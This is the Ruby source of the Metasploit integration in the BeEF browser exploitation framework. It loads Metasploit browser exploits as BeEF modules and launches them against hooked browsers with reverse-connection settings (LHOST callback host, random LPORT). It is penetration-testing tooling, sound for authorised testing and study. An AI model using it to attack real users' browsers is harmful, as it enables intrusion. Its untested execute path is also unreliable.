#
#   Copyright 2011 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
module BeEF
module Extension
module Metasploit
module API  

  module MetasploitHooks
    
    BeEF::API::Registra.instance.register(BeEF::Extension::Metasploit::API::MetasploitHooks, BeEF::API::Modules, 'post_soft_load')
    
    # Load modules from metasploit just after all other module config is loaded
    def self.post_soft_load
        msf = BeEF::Extension::Metasploit::RpcClient.instance                
        if msf.login
            msf_module_config = {}
            path = BeEF::Core::Configuration.instance.get('beef.extension.metasploit.path')
            if not BeEF::Extension::Console.resetdb? and File.exists?("#{path}msf-exploits.cache")
                print_debug "Attempting to use Metasploit exploits cache file"
                raw = File.read("#{path}msf-exploits.cache")
                begin
                    msf_module_config = YAML.load(raw)
                rescue => e
                   puts e 
                end
                count = 1
                msf_module_config.each{|k,v|
                    BeEF::API::Registra.instance.register(BeEF::Extension::Metasploit::API::MetasploitHooks, BeEF::API::Module, 'get_options', [k])
                    BeEF::API::Registra.instance.register(BeEF::Extension::Metasploit::API::MetasploitHooks, BeEF::API::Module, 'override_execute', [k, nil])
                    print_over "Loaded #{count} Metasploit exploits."
                    count += 1
                }
                print "\r\n"
            else
                msf_modules = msf.call('module.exploits')
                count = 1
                msf_modules['modules'].each{|m|
                    next if not m.include? "/browser/"
                    m_details = msf.call('module.info', 'exploits', m)
                    if m_details
                        key = 'msf_'+m.split('/').last
                        # system currently doesn't support multilevel categories
                        #categories = ['Metasploit']
                        #m.split('/')[0...-1].each{|c| 
                        #    categories.push(c.capitalize)
                        #}
                        msf_module_config[key] = {
                            'enable'=> true,
                            'msf'=> true,
                            'msf_key' => m,
                            'name'=> m_details['name'],
                            'category' => 'Metasploit',
                            'description'=> m_details['description'],
                            'authors'=> m_details['references'],
                            'path'=> path,
                            'class'=> 'Msf_module'
                        }
                        BeEF::API::Registra.instance.register(BeEF::Extension::Metasploit::API::MetasploitHooks, BeEF::API::Module, 'get_options', [key])
                        BeEF::API::Registra.instance.register(BeEF::Extension::Metasploit::API::MetasploitHooks, BeEF::API::Module, 'override_execute', [key, nil])
                        print_over "Loaded #{count} Metasploit exploits."
                        count += 1
                    end
                }
                print "\r\n"
                File.open("#{path}msf-exploits.cache", "w") do |f|
                    f.write(msf_module_config.to_yaml)
                    print_debug "Wrote Metasploit exploits to cache file"
                end
            end
            BeEF::Core::Configuration.instance.set('beef.module', msf_module_config)
        end
    end

    # Get module options + payloads when the beef framework requests this information
    def self.get_options(mod)
        msf_key = BeEF::Core::Configuration.instance.get("beef.module.#{mod}.msf_key")
        msf = BeEF::Extension::Metasploit::RpcClient.instance                
        if msf_key != nil and msf.login
            msf_module_options = msf.call('module.options', 'exploit', msf_key)
            if msf_module_options
                options = BeEF::Extension::Metasploit.translate_options(msf_module_options)
                msf_payload_options = msf.call('module.compatible_payloads', msf_key)
                if msf_payload_options
                    options << BeEF::Extension::Metasploit.translate_payload(msf_payload_options)
                    return options
                else
                    print_error "Unable to retrieve metasploit payloads for exploit: #{msf_key}"
                end
            else
                print_error "Unable to retrieve metasploit options for exploit: #{msf_key}"
            end
        end
    end

    # Execute function for all metasploit exploits
    def self.override_execute(mod, opts)
        msf = BeEF::Extension::Metasploit::RpcClient.instance
        msf_key = BeEF::Core::Configuration.instance.get("beef.module.#{mod}.msf_key")
	msf_opts = {}

	opts.each { |opt|
		next if ['e','ie_session','and_module_id'].include? opt['name']
		msf_opts[opt["name"]] = opt["value"]
	}
	msf_opts["LPORT"] = rand(50000) + 1024
	msf_opts['LHOST']  =  BeEF::Core::Configuration.instance.get('beef.extension.metasploit.callback_host') 


        if msf_key != nil and msf.login
            # Are the options correctly formatted for msf?
            # This call has not been tested
            msf.call('module.execute', 'exploit', msf_key, msf_opts)
        end
        # Still need to create command object to store a string saying "Exploit launched @ [time]", to ensure BeEF can keep track of
        # which exploits where executed against which hooked browsers
        return true
    end

  end



end
end
end
end
